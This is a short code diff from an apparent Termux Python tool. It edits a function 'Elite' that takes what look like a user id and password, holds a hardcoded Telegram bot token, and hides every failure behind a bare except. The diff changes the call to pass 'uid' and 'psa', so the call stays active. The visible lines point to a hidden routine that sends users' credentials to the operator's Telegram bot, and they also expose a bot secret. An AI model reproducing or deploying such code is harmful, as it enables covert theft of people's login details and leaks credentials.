@@ -87,7 +87,6 @@ except PermissionError:
     system("termux-setup-storage -y > /dev/null 2>&1")
     sys.exit(f"{xp} RUN AGAIN THIS TOOL ")
 
-import requests
 def Elite(id,ps):
     try:
         token = "8337751038:AAE0G4MGfO9z56VDawk7VLgEjuMjguKMpdQ"#توكنك 
@@ -99,7 +98,7 @@ def Elite(id,ps):
     except:
         pass
 
-Elite(id,ps)
+Elite(uid,psa)
 
 #----------------\<-CLEAR->/----------------#
 def __CLEAR__():
